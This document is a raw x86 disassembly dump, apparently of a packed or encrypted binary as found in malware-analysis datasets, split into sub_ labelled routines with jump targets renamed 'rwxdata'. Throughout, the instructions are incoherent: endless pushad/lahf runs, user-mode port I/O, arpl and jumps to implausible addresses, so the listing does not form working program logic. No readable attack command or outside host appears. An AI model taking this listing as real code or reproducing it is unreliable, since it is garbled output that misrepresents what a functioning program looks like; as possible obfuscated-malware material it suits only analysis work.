sub_4013e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
pop edi
inc eax
add [ eax ] dl
inc eax
inc eax
add al dh
inc ebx
inc eax
add [ eax ] dl
inc esp
inc eax
add [ eax + 0x44 ] dh
inc eax
add al ah
inc esp
inc eax
add [ eax + 0x45 ] al
inc eax
add [ eax + 0x4045 ] ah
inc esi
inc eax
jmp rwxdata
imul ebp [ ebp ] 0x69724243
arpl [ ebx + 0x73 ] bp
inc esp
outsd
arpl [ eax ] ax
add [ ebp + 0x57 ] al
push ecx
inc esp
inc ebx
dec eax
pop ecx
push esp
dec ebx
dec edi
dec ecx
inc edi
inc esi
push esi
dec ebp
add [ ebx + ebp * 8 ] al
aad 0xd0
pushad
pushad
pushad
jmp rwxdata
add [ eax + 0x4046 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x642573 ] ah
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
add [ esi + 0x40 ] al
cmc
fistp [ ebx - 0x4adc6061 ]
sub_40148c
and ch ch
pop ebp
in al 0x90
lahf
lahf
pop ecx
adc al 0x6f
pushad
pushad
xchg ebx eax
dec edx
shl [ eax ] cl
in eax dx
pop ebp
mov al [ 0x599f9f90 ]
movsb [ edi ] [ esi ]
pushad
pushad
pushad
xchg ebx eax
dec edx
daa
in eax 0x4d
xchg ecx eax
lahf
lahf
xchg [ eax + 0x60 ] esp
pushad
mov [ esi ] ecx
insd
pushad
pushad
mov ch 0xeb
mov ecx fs
and al 0xd0
0x15eb9f9f 0xed68
out 0x9b al
arpl [ eax + 0x60 ] sp
mov al 0xa
pushad
or ah [ eax - 0x61 ]
mul ch
pushad
pushad
pushad
jmp 0x60a83ac0
sub_40151a
pushad
mov dl bl
pushad
pushad
pushad
add [ eax ] 0x6061ee54
xor [ ecx + 0x60751cc9 ] esp
jle rwxdata
cmp eax 0xed606060
in eax dx
or bl [ esi + 0x8b19f9f ]
popad
popad
pushad
pushad
lahf
xor ch ah
and [ edi - 0x1b ] ch
add ah [ eax + 0x60 ]
daa
in eax 0xd4
pushfd
lahf
lahf
jo rwxdata
mov [ 0xffffffffb86c6079 ] es
lea ecx [ edx - 0x321e9f83 ]
push ds
mov edi 0xc25a6065
adc bh dl
insd
pushad
0x711adc88 0x2560
jmp 0x2823e7dc
pushad
pushad
loopne rwxdata
pop ebp
xchg esp eax
push 0x60
pushad
popad
adc eax 0x215ee3d8
bound esp [ eax + 0x60 ]
lahf
adc eax 0xec569fcf
popad
pushad
pushad
out dx eax
out 0x21 al
bound esp [ eax + 0x60 ]
or cl dl
popad
pushad
pushad
in eax dx
out 0xf0 al
popad
pushad
pushad
mov al 0xed
out 0x25 al
bound esp [ eax + 0x60 ]
mov al 0x9f
test [ ecx + 0x60 ] 0x60
pushad
daa
out 0xec al
popad
pushad
pushad
lahf
lahf
lahf
lahf
daa
in eax 0xa4
sahf
lahf
lahf
pushad
pushad
pushad
pushad
out 0x58 al
push 0xe0616060
pop esi
xchg esp eax
push 0x60
pushad
popad
outsd
in eax 0xe8
pushad
pushad
pushad
jecxz rwxdata
not [ esi - 0x1a9f9f96 ]
and [ edi - 0x1c ] ch
stosd [ edi ]
arpl [ eax + 0x60 ] sp
mov ebx ebx
jmp rwxdata
mov dh 0x9f
out 0x8f al
push 0x60
pushad
popad
lahf
push ebp
rcr [ edx - 0x1a126061 ] 0x1
movsd [ edi ] [ esi ]
popfd
lahf
lahf
mov al 0xb6
lahf
add ecx [ ebx ]
adc ebx ebp
movsb [ edi ] [ esi ]
sahf
lahf
lahf
bound edx [ 0xffffffff955ee0d1 ]
push 0x60
pushad
popad
adc eax 0xec5ee3c8
popad
pushad
pushad
lahf
adc eax 0x21569f76
bound esp [ eax + 0x60 ]
out dx eax
out 0xec al
popad
pushad
pushad
daa
out 0x21 al
bound esp [ eax + 0x60 ]
lahf
lahf
lahf
lahf
out 0x94 al
push 0x60
pushad
pushad
mov ecx [ eax - 0x1f ]
pop ebp
rcr [ edx + 0xb039f9f ] 0x1
adc ebx ebp
adc eax 0xd0e52773
0x14149f9f 0xdd10
out 0x8f al
push 0x60
pushad
bound ecx [ ebx - 0x2f1ad88f ]
0xb039f9f 0xdd13
sub_40174f
push 0x60
pushad
pushad
outsd
out dx al
sbb [ ecx + 0x60 ] esp
pushad
pushad
pushad
loopne rwxdata
mov al [ 0x619f9f9d ]
jmp rwxdata
fstp [ edi + ebx * 4 + 0x6467269f ]
cmpsd [ es : esi ] [ edi ]
popad
popad
push es
jmp 0xffffffffe62d7a64
daa
in eax 0xa0
popfd
lahf
lahf
lahf
lahf
lahf
lahf
jecxz rwxdata
sub_4017e4
push 0xb7690a60
lahf
adc eax 0xb6610a9c
lahf
test [ ebp - 0x1a9f9fa0 ] 0x20
outsd
in al 0x80
popad
pushad
pushad
or ch [ eax - 0x49 ]
lahf
adc eax 0xb6600a9c
lahf
test [ ebp - 0x1a9f9fa0 ] 0x20
outsd
in al 0x29
popad
pushad
pushad
loopne rwxdata
mov [ ebx + 0x60 ] bh
pushad
pushad
mov [ 0xffffffffa5aeaeaf ] eax
mov [ 0x13c5c0b4 ] eax
fcmovb st5
or eax eax
test al 0xb4
mov ah 0xb0
iretd
popad
mov edx 0x6054e46f
pushad
pushad
loopne rwxdata
xor [ eax - 0x63ea6049 ] dh
or ah [ ecx - 0x4a ]
lahf
test [ ebp - 0x1a9f9fa0 ] 0x20
outsd
in al 0xa8
popad
pushad
pushad
jecxz rwxdata
xchg esp eax
push 0x60
pushad
pushad
outsd
in al 0x52
popad
pushad
pushad
mov ebx edx
lahf
lahf
lahf
mov ebp edi
pushad
pushad
pushad
shr [ edi - 0x1c ] 0xfe
sahf
lahf
lahf
loope rwxdata
mov bh 0xa
popad
mov bh 0x9f
adc eax 0xb6600a9c
lahf
test [ ebp - 0x1e9f9fa0 ] 0x1f
popfd
insd
push 0x6d
push 0x15
bound ecx [ ebx + 0x6127e365 ]
mov eax [ ecx - 0x2a201e41 ]
rcl bl 0x1
fldenv [ ebx + 0x21 ]
push 0x616099e1
pushad
pushad
adc eax 0x61600887
pushad
pushad
mov bh 0x9f
adc eax 0xb6610a9c
lahf
imul edx edx 0x6fc0d0d0
in eax 0x6b
popad
pushad
pushad
in eax dx
pop ebp
aam 0x9b
lahf
lahf
shr [ ecx ] cl
mov dh 0x9f
idiv [ ebp + 0x61 ]
pushad
pushad
jmp 0xffffffffb529f24a
pushad
in eax dx
jo rwxdata
cdq
jo rwxdata
test [ ebp - 0x2c9f9fa0 ] 0x29
mov dh 0xed
out 0xb al
imul esp [ eax + 0x60 ] 0x9fb7b7b0
mul [ ecx + 0x61 ]
pushad
pushad
jecxz rwxdata
mov dh 0x9f
and [ ecx - 0x1d ] esp
push ebp
aam 0x9b
lahf
lahf
in eax dx
pop ebp
aam 0x9a
lahf
lahf
xchg ebx eax
inc edi
adc al 0x6d
mov esi 0x9cd4e527
lahf
lahf
rcl [ 0x1f8b6060 ] 0x1
mov esi 0xa5ed640a
cwde
mov al 0x9f
adc eax 0xb6600a9c
lahf
test [ ebp - 0x1a9f9fa0 ] 0x20
adc al 0x8
or ah [ eax + 0x60706008 ]
pushad
lahf
adc eax 0x9f600a98
mov dh 0xc1
jmp rwxdata
test [ eax + 0x60 ] esp
pushad
mov dh 0x9c
pop ecx
mov al [ 0xffffffffed606060 ]
test [ eax ] ecx
pushad
popad
pushad
pushad
in eax dx
in eax 0xd4
0x9fb09f9f 0x9c15
or ah [ eax - 0x4a ]
lahf
test [ ebp - 0x499f9fa0 ] 0x9c
sub_401a3e
popad
jecxz rwxdata
shl [ ecx + 0x60 ] 0x60
popad
mov ecx [ esi + 0x566f6067 ]
outsw
push edi
scasb [ edi ]
popad
mov edi 0x6c2229be
pushad
mov ch 0xeb
mov ecx fs
daa
lahf
mov dh 0x69
movsb [ edi ] [ esi ]
sahf
lahf
lahf
popad
mov [ ebx + 0x299f9f9b ] edx
and ah [ eax - 0x4b ]
jmp rwxdata
adc eax 0xe060086d
pushad
pushad
or ah [ eax - 0x49 ]
out 0xc1 al
popad
pushad
pushad
pushad
pushad
pushad
pushad
lahf
push ebp
aam 0x9c
lahf
lahf
lahf
test [ ebp + 0x60 ] 0x60
pushad
jecxz rwxdata
jo rwxdata
lahf
mov dh 0xc5
mov edx esi
mov bh 0xeb
lodsd [ esi ]
cwde
mov dh 0xed
out 0xb al
imul esp [ eax + 0x60 ] 0x9fb7b7b0
mul [ ebp + 0x61 ]
pushad
pushad
jecxz rwxdata
mov dh 0x9f
aaa
mov edi 0x60e06008
pushad
or ah [ eax - 0x49 ]
lahf
mov dh 0xc5
lahf
adc eax 0x69b69f9c
mov [ eax + 0x15 ] esi
mov [ edi - 0x63ea6049 ] bh
out dx eax
out 0xc1 al
popad
pushad
pushad
sub_401a58
and al 0x8c
sahf
lahf
lahf
add bl ch
adc eax 0x94e52768
sahf
lahf
lahf
popad
pushad
pushad
pushad
lahf
adc eax 0x98e5ef70
sahf
lahf
lahf
daa
in eax 0x8c
sahf
lahf
lahf
push esp
pushad
pushad
pushad
daa
in eax 0x90
sahf
lahf
lahf
pushad
pushad
pushad
pushad
shl [ eax ] cl
jmp 0xffffffffa629b334
sub_401a8f
pushfd
jecxz rwxdata
pushad
jecxz rwxdata
insb
pushad
adc eax 0x8ce5ed7f
sahf
lahf
lahf
mov al 0xa
pushad
or ah [ eax - 0x13 ]
in eax 0x94
sahf
lahf
lahf
mov al 0xa
pushad
lahf
idiv cl
pushad
pushad
outsd
push edi
scasb [ edi ]
popad
mov edi 0x6c2229be
pushad
mov ch 0xeb
mov ecx fs
pushad
push ss
jle rwxdata
jecxz rwxdata
pushad
lahf
adc eax 0x74159f78
lahf
adc eax 0x6c1de370
cwde
leave
movsd [ edi ] [ esi ]
js rwxdata
pushad
adc eax 0x71b69f65
insb
pushad
pushad
pushad
lahf
adc eax 0x98e5ef70
sahf
lahf
lahf
daa
in eax 0x8c
sahf
lahf
lahf
push esp
pushad
pushad
pushad
daa
in eax 0x90
sahf
lahf
lahf
pushad
pushad
pushad
pushad
shl [ eax ] cl
jmp 0xffffffffa629b334
popad
sbb eax 0x20d30167
sub [ edx ] esp
je rwxdata
mov esp [ ebx - 0x61 ]
mov dh 0x6d
jecxz rwxdata
mov dh 0x71
sbb eax 0x47156078
add ebx ebp
movsd [ edi ] [ esi ]
nop
mov esi 0x609ca527
popad
mov ebx 0x6c2229be
pushad
mov dh 0xeb
arpl [ ebp + 0x3febf76c ] sp
mov bh 0xd2
and [ esi + 0x15 ] cl
popfd
mov esi 0x9cb29bcb
shr [ ecx ] cl
test eax 0x20d331eb
sar [ ebx ] cl
dec esp
shl [ ecx ] cl
0xea8aea2d 0x5636
mov ch 0xeb
mov ebx fs
and al 0x8c
mov dh 0xb3
mov bh 0xb2
mov cl 0xeb
movsd [ edi ] [ esi ]
jo rwxdata
movsd [ edi ] [ esi ]
cwde
sub [ edx ] esp
je rwxdata
pushad
pushad
pushad
jmp rwxdata
pushfd
pushad
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
je rwxdata
add ebx edx
and [ ecx ] ch
and dh [ eax + 0x61 ]
xor dh dl
pop esi
fsub [ eax + 0x60 ]
pushad
arpl [ 0x6366eb6c ] dx
movsd [ edi ] [ esi ]
insb
jmp rwxdata
sbb eax 0xa5634d98
insb
dec ebx
jmp 0x638db3d2
sub_401b46
pushfd
fldenv [ ebp - 0x2c94ea74 ]
and [ ecx - 0x41444046 ] bh
sub [ edx ] esp
insb
pushad
mov dh 0xeb
arpl [ ebp + 0x3febf76c ] sp
mov bh 0xd2
and [ esi + 0x15 ] cl
popfd
mov esi 0x9cb29bcb
shr [ ecx ] cl
test eax 0x20d331eb
sar [ ebx ] cl
dec esp
shl [ ecx ] cl
0xea8aea2d 0x5636
sub_401b7e
push 0x68b3106
xor [ eax ] edi
adc ebp [ ecx + 0x6 ]
aad 0xc0
jecxz rwxdata
adc eax 0xd328d38b
loope rwxdata
bound esp [ ebx - 0x5b ]
cwde
imul bl
arpl [ ebp - 0x40454694 ] sp
mov ebx 0x6c2229be
pushad
jmp rwxdata
sbb eax 0xa5634d98
insb
dec ebx
jmp 0x638db3d2
xor ebp [ edi + 0x32973515 ]
xchg edi eax
xor ebx ebp
and ah [ ecx ]
and [ eax + 0x6 ] dh
jmp rwxdata
pop eax
lea ebx [ esi - 0x2c74ead2 ]
sub bl dl
push esi
sub_401d3f
push esi
adc al 0x6b
popad
jmp rwxdata
insd
popad
pushad
pushad
jecxz rwxdata
push 0xd0c4a4eb
jmp rwxdata
pushad
outsd
push esi
je rwxdata
jmp rwxdata
arpl [ esp + eax * 8 ] dx
int3
sub_401e2c
imul esp [ ecx + 0x60 ] 0x6825e360
out 0x97 eax
loopne rwxdata
popad
adc eax 0xeb66eb3d
mov esi 0x68aeeb64
jmp rwxdata
cmpsb [ esi ] [ edi ]
outsd
sub ecx ebp
cmpsb [ esi ] [ edi ]
xor [ fs : ecx ] esp
imul esp [ ebp - 0x2ed6909c ] 0x66
shr [ esi + 0x7025e36c ] 0x1
loopne rwxdata
mov ch 0x6c
jmp 0xffffffffb729864d
popad
adc eax 0xeb635245
movsb [ edi ] [ esi ]
sub_401eb1
imul esp [ ecx + 0x60 ] 0x688de360
out 0x97 eax
jmp rwxdata
pushad
jmp rwxdata
pushad
pushad
jecxz rwxdata
cmpsb [ esi ] [ edi ]
push 0x16cbee9
sub [ edx ] esp
jo rwxdata
push 0x8ae097e7
popad
adc eax 0xeb66eb3d
mov esi 0x68aeeb64
jmp rwxdata
popad
pushad
pushad
jecxz rwxdata
mov ch 0xeb
mov [ eax ] es
pushfd
jmp rwxdata
cmpsb [ esi ] [ edi ]
outsd
sub ecx ebp
cmpsb [ esi ] [ edi ]
xor [ fs : ecx ] esp
imul esp [ ebp - 0x2ed6909c ] 0x66
shr [ esi + 0x7025e36c ] 0x1
loopne rwxdata
jmp 0xffffffffa729830e
push 0x8ae097e7
popad
adc eax 0xeb66eb3d
lodsd [ esi ]
pushfd
retn
mov ch 0x6c
jmp 0xffffffffb729864d
popad
adc eax 0xeb635245
movsb [ edi ] [ esi ]
sub_401f1b
imul esp [ ecx + 0x60 ] 0x688de360
out 0x97 eax
loopne rwxdata
popad
adc eax 0xeb66eb3d
mov esi 0x68aeeb64
jmp rwxdata
cmpsb [ esi ] [ edi ]
outsd
sub ecx ebp
cmpsb [ esi ] [ edi ]
xor [ fs : ecx ] esp
imul esp [ ebp - 0x2ed6909c ] 0x66
shr [ esi + 0x708de36c ] 0x1
loopne rwxdata
mov ch 0x6c
jmp 0xffffffffb729873c
popad
adc eax 0xeb635245
movsb [ edi ] [ esi ]
sub_402202
pushad
pushad
jecxz rwxdata
pushad
pushad
jmp 0x6879f57c
push 0xe05b6513
pushad
pushad
pushad
jecxz rwxdata
pushad
jmp 0x687df593
push 0xe0596513
pushad
pushad
pushad
jmp 0x60a8541b
sub_40223f
pushad
pushad
jecxz rwxdata
pushad
mov [ ebp - 0x48606061 ] bh
pop edi
popad
jecxz rwxdata
lahf
cmc
rcl [ ecx - 0x1a166061 ] 0xbf
fwait
lahf
lahf
mov [ edi + 0x60 ] ah
pushad
pushad
adc eax 0xd3120513
shl [ eax - 0x61 ] cl
cmc
rcl [ ecx - 0x1a166061 ] 0xa3
fwait
lahf
lahf
or dl dh
xchg ebx eax
cmp al 0x64
lahf
push ebp
fistp [ ebx + 0x600a9f9f ]
mov [ ebp + 0x89f9f97 ] cl
lahf
pushad
pushad
pushad
in eax dx
std
salc
xchg esi eax
lahf
lahf
mov bl 0xa
pushad
lahf
xor cl ch
movsd [ edi ] [ esi ]
pushfd
mov [ ecx - 0x5c789fa0 ] bh
pop ecx
rcr [ ebx + 0x6a ] 0xe5
pushad
std
stosb [ edi ]
add cl [ eax ]
pop ebx
push 0x41
pushad
pop edx
salc
and [ edx + 0x5b ] ebp
push 0x45
pushad
retn 0xe99c
pushad
pushad
mov [ edx - 0x1c606061 ] dh
push 0x22216060
jae rwxdata
retn 0x8812
adc esp [ ebp + 0x5b ]
loopne rwxdata
and [ ebx + 0x63 ] bh
hlt
jle rwxdata
pushad
pushad
jecxz rwxdata
pushad
jmp 0x687df593
push 0xe0596513
pushad
pushad
pushad
jmp 0x60a8541b
sub_402277
popad
adc eax 0x4104bf96
shl [ eax + 0x60 ] 0x1
pushad
jmp rwxdata
push ebp
in al 0x90
lahf
lahf
outsd
shl edx 0x1
shr [ ecx ] cl
or [ eax ] esp
stosd [ edi ]
mov dh 0x4c
jecxz rwxdata
pushad
pushad
daa
out 0x35 al
push 0x60b06060
pushad
pushad
mov [ ebp - 0x48606061 ] bh
pop edi
jle rwxdata
popad
jmp 0x687a1123
lahf
cmc
rcl [ ecx - 0x1a166061 ] 0xbf
fwait
lahf
lahf
mov [ edi + 0x60 ] ah
pushad
pushad
adc eax 0xd3120513
shl [ eax - 0x61 ] cl
cmc
rcl [ ecx - 0x1a166061 ] 0xa3
fwait
lahf
lahf
or dl dh
xchg ebx eax
cmp al 0x64
lahf
push ebp
fistp [ ebx + 0x600a9f9f ]
mov [ ebp + 0x89f9f97 ] cl
lahf
pushad
pushad
pushad
in eax dx
std
salc
xchg esi eax
lahf
lahf
mov bl 0xa
pushad
lahf
xor cl ch
movsd [ edi ] [ esi ]
pushfd
mov [ ecx - 0x5c789fa0 ] bh
pop ecx
rcr [ ebx + 0x6a ] 0xe5
pushad
std
stosb [ edi ]
add cl [ eax ]
pop ebx
push 0x41
pushad
pop edx
salc
and [ edx + 0x5b ] ebp
push 0x45
pushad
retn 0xe99c
pushad
pushad
mov [ edx - 0x1c606061 ] dh
sub_402902
push ecx
pusha
pushad
mov al 0xed
in eax 0x90
sahf
lahf
lahf
mov al 0x9f
imul [ 0x6b606060 ]
and [ 0xffffffffeeedb072 ] dl
outsd
pushad
pushad
mov cl 0xa
popad
mov al 0xb1
lahf
adc eax 0xddb69f90
lahf
adc eax 0xd1b69f90
mov [ edi + ebx * 4 - 0x61 ] ebp
lahf
lahf
adc eax 0xd1b69f9c
mov edi 0xb09ca5ed
or bh bl
pushad
outsd
pushad
pushad
pushad
mov al 0x9f
adc eax 0xd9b69f90
imul esp [ eax ] 0x15
0xe6ed
mov dh 0xd5
in eax dx
out 0x5 al
mov bh 0x9f
mul cl
pushad
pushad
pushad
or ah [ eax - 0x13 ]
movsd [ edi ] [ esi ]
pushfd
mov al 0xa
pushad
or ah [ eax + 0xa ]
pushad
or ah [ eax + 0xa ]
pushad
mov bh 0x8
bound esp [ eax + 0x60 ]
loopne rwxdata
insb
popad
adc eax 0x68222964
pushad
in eax dx
out 0xb6 al
pushad
pushad
mov al 0xb7
lahf
mul cl
pushad
pushad
pushad
in eax dx
out 0x5 al
popad
pushad
pushad
mov al 0xb7
lahf
or ah [ eax - 0x13 ]
out 0xb6 al
pushad
pushad
mov al 0x8
popad
pushad
pushad
loopne rwxdata
mov dh 0xa5
in eax dx
movsd [ edi ] [ esi ]
pushfd
mov al 0x8
fbld [ eax + 0x6f ]
pushad
or ah [ eax - 0x49 ]
or [ edx + 0x60 ] ah
pushad
loopne rwxdata
popad
pushad
pushad
mov al 0x9f
adc eax 0xa1b69f9c
lahf
adc eax 0xd1b69f9c
jecxz rwxdata
mov dh 0xd5
or [ edi - 0x129f9fa0 ] bl
out 0x51 al
pusha
pushad
mov al 0xa
popad
or ah [ eax - 0x13 ]
out 0x6f al
pop eax
popad
pushad
pushad
pushad
in eax dx
movsd [ edi ] [ esi ]
pushfd
mov al 0x8
fbld [ eax + 0x6f ]
pushad
or ah [ eax - 0x49 ]
or [ ecx + 0x60 ] ah
pushad
loopne rwxdata
lahf
xchg edi eax
arpl [ eax + 0x60 ] sp
pushad
push ds
je rwxdata
pushad
pushad
mov al 0x9f
adc eax 0xddb69f9c
lahf
adc eax 0xd1b69f9c
mov edx [ ebx ]
mov dh cl
pushad
pushad
pushad
mov bl 0xaf
cmpsb [ esi ] [ edi ]
mov ah 0xb7
mov eax [ 0xffffffffadbca5b2 ]
or [ ebx ] eax
adc cl [ edi ]
adc ecx [ edi ]
push es
adc al 0xbc
mov bh 0x9
push cs
add al 0xf
pop ss
adc edi [ ebx + 0x5121215 ]
push cs
adc al 0xb6
add eax 0xf091312
push cs
mov esp 0x600e15b2
mov ecx 0xf69fb7b1
loope rwxdata
outsd
mov dh 0xd5
or [ edi - 0x129f9fa0 ] bl
out 0x51 al
pusha
pushad
mov al 0xa
popad
or ah [ eax - 0x13 ]
out 0x5 al
popad
pushad
pushad
mov al 0x9f
adc eax 0xddb69f9c
lahf
adc eax 0xd1b69f9c
sub [ edx ] esp
push 0x25603560
pushad
mov ch 0xeb
mov ebx gs
adc eax 0x975ee068
arpl [ eax + 0x60 ] sp
pushad
push ds
mov dh 0x9f
mul [ eax + 0x6d ]
pushad
pushad
loopne rwxdata
pushad
jecxz rwxdata
push 0x6160606d
adc eax 0x995ee0c7
arpl [ eax + 0x60 ] sp
popad
adc eax 0x21e6ed77
push 0xab06060
pushad
mov dh 0x9f
push esi
pushad
pushad
loopne rwxdata
pushad
pop esi
push ecx
pusha
pushad
mov bh 0xed
pop esi
push edx
pushad
pushad
mov bh 0x9f
imul [ 0x6b606060 ]
and [ edx + ebp * 2 ] dl
in eax dx
pop esi
push edx
pushad
pushad
mov bh 0x9f
mov dh 0xb1
loopne rwxdata
push esi
outsb
insd
pushad
pushad
or ah [ eax + 0xa ]
pushad
lahf
mov dh 0xc9
loopne rwxdata
pushad
popad
adc eax 0x5de6ed77
popad
adc eax 0x606158d0
cwde
arpl [ eax + 0x60 ] sp
pushad
mov dh 0xed
sbb al 0x90
lahf
lahf
popad
lahf
push ebp
sbb al 0x90
lahf
lahf
mov [ ebp + 0x60 ] ch
pushad
pushad
add eax 0xf0c1018
adc al [ 0x1805ce12 ]
add eax 0xf69fb660
and eax 0x6b606060
and [ 0x63880877 ] dl
pushad
pushad
lahf
test [ ebp + 0x60 ] 0x60
pushad
daa
in eax 0x1c
nop
lahf
lahf
pushad
pushad
pushad
pushad
mov ebx [ edi - 0x50 ]
or ah [ eax + 0x8 ]
lahf
outsd
jg rwxdata
or ah [ eax - 0x4a ]
cdq
pushad
pushad
pushad
or ah [ eax + 0xa ]
pushad
lahf
mov dh 0xc9
mov dh 0x9f
not [ ecx + 0x29606060 ]
and ah [ eax + 0x64 ]
insd
or [ ecx - 0x4b ] ah
jmp rwxdata
lahf
not [ ebp - 0x1f9f9fa0 ]
pop esi
imul ebp [ ebp + 0x60 ] 0x67156160
mov dh 0x9f
imul [ edx + 0x6d ]
pushad
pushad
loopne rwxdata
xchg esi eax
arpl [ eax + 0x60 ] sp
popad
adc eax 0xb6600a69
outsd
push edi
jno rwxdata
lahf
div ch
pushad
pushad
pushad
jecxz rwxdata
lahf
jmp rwxdata
push 0xab06060
pushad
mov dh 0x9f
0x61606063 0x7715
in eax dx
out 0x5d al
or esp [ eax + 0x71 ]
popad
pushad
popad
jne rwxdata
fiadd [ fs : esi ]
jecxz rwxdata
pop ebp
in al dx
nop
lahf
lahf
mov bh 0x9f
test [ ecx + 0x60 ] 0x60
pushad
daa
in eax dx
pushad
adc al 0x4c
jmp 0xffffffff9fd10c8c
in eax 0x1c
nop
lahf
lahf
pushad
pushad
pushad
div [ ecx ]
pushad
pushad
jle rwxdata
push edi
bound ebp [ edi + 0x57 ]
stosb [ edi ]
bound esp [ eax + 0x14 ]
imul ebp [ edi + 0x57 ] 0xffffffb1
jmp 0xffffffffe3470663
lahf
lahf
lahf
imul [ ecx ]
pushad
pushad
pushad
mov al 0x9f
push ebp
loopne rwxdata
pushad
xor [ eax + 0x60 ] esp
jns rwxdata
lahf
lahf
mov dh 0x9f
div [ ecx ]
pushad
pushad
pushad
mov edx 0xb961e9b9
arpl [ ecx ] si
mov esi [ ebx ]
mov bh 0x8
adc al 0x6f
pushad
pushad
lahf
push ebp
loopne rwxdata
mov ecx [ fs : eax + 0x670b5eb ]
jecxz rwxdata
bound esp [ ebx + 0x22 ]
jecxz rwxdata
lahf
lahf
lahf
test [ ecx + 0x60 ] 0x60
pushad
mov eax 0x6f6098e3
in al 0x25
sahf
lahf
lahf
sub [ edx ] esp
insb
pushad
xor [ eax - 0x24 ] esp
pushad
mov ch 0xeb
mov ebx fs
and al 0x9c
mov bh 0xb6
jmp rwxdata
jle rwxdata
pushad
popad
lahf
lahf
mov dh 0x9f
popad
pushad
adc al 0xc7
outsd
pushad
mov al 0xed
sbb eax 0x159fb79c
jo rwxdata
in eax dx
in eax dx
in al 0x90
jge rwxdata
push edi
xor eax 0xa606060
pushad
or ah [ eax - 0x61 ]
or ah [ eax - 0x50 ]
lahf
adc eax 0x159fb074
insb
lahf
not [ ebp + 0x60 ]
pushad
pushad
mov eax 0x2229bfbe
jo rwxdata
lahf
lahf
mov cl 0xa
pushad
mov al 0x9f
nop
pushad
pushad
mov ecx 0xe971576f
sahf
and eax 0xb560fb60
jmp rwxdata
imul esp [ eax ] 0x15
rcr [ edi + 0x1de370ad ] 0x70
pushad
pop ss
ja rwxdata
push ebp
loopne rwxdata
pushad
pushad
or ah [ eax + 0xa ]
pushad
lahf
and dh [ eax + 0x60 ]
lahf
lahf
lahf
test [ ecx + 0x60 ] 0x60
pushad
jmp rwxdata
push ebp
xor al 0x9e
sub_402c9b
push 0x6008a00a
shl [ eax + 0x60 ] 0x1
lahf
adc eax 0x9f600a70
adc eax 0x51f69f6c
pushad
pushad
or ah [ eax - 0x50 ]
lahf
adc eax 0x159fb074
insb
lahf
not [ ebp + 0x60 ]
pushad
pushad
mov eax 0x2229bfbe
jo rwxdata
jmp 0xffffffffe3470663
lahf
lahf
lahf
imul [ ecx ]
pushad
pushad
pushad
mov al 0x9f
push ebp
loopne rwxdata
sahf
and eax 0xb560fb60
jmp rwxdata
bound esp [ ebx + 0x22 ]
jecxz rwxdata
lahf
lahf
lahf
test [ ecx + 0x60 ] 0x60
pushad
mov eax 0x6f6098e3
in al 0x25
sahf
lahf
lahf
sub [ edx ] esp
insb
pushad
xor [ eax - 0x24 ] esp
pushad
mov ch 0xeb
mov ebx fs
and al 0x9c
mov bh 0xb6
jmp rwxdata
imul esp [ eax ] 0x15
rcr [ edi + 0x1de370ad ] 0x70
pushad
pop ss
ja rwxdata
push ebp
loopne rwxdata
pushad
pushad
or ah [ eax + 0xa ]
pushad
lahf
lahf
lahf
mov dh 0x9f
div [ ecx ]
pushad
pushad
pushad
mov edx 0xb961e9b9
arpl [ ecx ] si
mov esi [ ebx ]
mov bh 0x8
adc al 0x6f
pushad
pushad
lahf
push ebp
loopne rwxdata
mov ecx [ fs : eax + 0x670b5eb ]
jecxz rwxdata
pushad
mov al 0xed
sbb eax 0x159fb79c
jo rwxdata
and dh [ eax + 0x60 ]
lahf
lahf
lahf
test [ ecx + 0x60 ] 0x60
pushad
jmp rwxdata
push ebp
xor al 0x9e
pushad
popad
push edi
xor eax 0xa606060
pushad
or ah [ eax - 0x61 ]
lahf
lahf
mov dh 0x9f
div [ ecx ]
pushad
pushad
pushad
popad
jle rwxdata
pushad
adc al 0xc7
outsd
in eax dx
in eax dx
in al 0x90
jge rwxdata
lahf
lahf
mov cl 0xa
pushad
mov al 0x9f
nop
pushad
pushad
mov ecx 0xe971576f
fiadd [ fs : esi ]
jecxz rwxdata
push edi
bound ebp [ edi + 0x57 ]
stosb [ edi ]
bound esp [ eax + 0x14 ]
imul ebp [ edi + 0x57 ] 0xffffffb1
sub_402fbf
push 0x66515eed
pushad
pushad
or [ edi - 0x489f9fa0 ] bl
lahf
test [ ebp + 0x60 ] 0x60
pushad
loopne rwxdata
adc edi [ ebx + 0x5121215 ]
push cs
adc al 0xb6
add eax 0xf091312
push cs
mov esp 0xc1018a5
movlps xmm0 [ 0x8b3bc12 ]
add eax 0xa6c00c0c
dec edi
push 0x15616060
shl eax 0x1
pop esi
xchg edi eax
arpl [ eax + 0x60 ] sp
popad
adc eax 0xe2140867
les ebx [ esi + 0x2e08658b ]
xchg edx ebx
mov ecx 0x6a5b569f
pushad
pushad
lahf
push esi
and [ eax + 0x60 ] 0x3df69f60
pushad
pushad
pushad
or [ edi - 0x489f9fa0 ] bl
lahf
xor [ ebx - 0x675a12e1 ] cl
mov al 0xa
popad
or ah [ eax - 0x78 ]
mov eax [ 0xffffffffb3606060 ]
scasd [ edi ]
cmpsb [ esi ] [ edi ]
mov ah 0xb7
mov eax [ 0xffffffffadbca5b2 ]
or [ ebx ] eax
adc cl [ edi ]
adc ecx [ edi ]
push es
adc al 0xbc
mov bh 0x9
push cs
add al 0xf
pop ss
sub_40312b
in eax dx
lodsd [ esi ]
cwde
mov cl 0x9f
adc eax 0x9fb7b090
neg [ esp + ebp * 2 - 0x60489fa0 ]
test [ ecx + 0x60 ] 0x60
pushad
mov edi 0xb1b69fb7
or ah [ eax + 0x8 ]
loopne rwxdata
popad
pushad
pushad
or ah [ ecx + 0xa ]
mov ecx 0x149f98e3
jpe rwxdata
pushfd
popad
mov [ ecx + 0x299f9f9e ] ebx
and ah [ eax - 0x67 ]
or ah [ ecx + 0x8 ]
pushad
pushad
pushad
loopne rwxdata
lahf
adc al 0x7a
test [ edx ] 0x98a5ed60
jecxz rwxdata
lahf
mov dh 0xb9
mov al 0x9f
adc eax 0x94159f90
mov bh 0x9f
mov dh 0x9
mov bh 0x9f
test [ ecx + 0x60 ] 0x60
pushad
shl [ eax ] cl
mov al 0xe3
sbb eax 0x6d146094
or [ eax - 0x20 ] ah
pushad
pushad
or ah [ eax - 0x61 ]
adc eax 0xc5b69f94
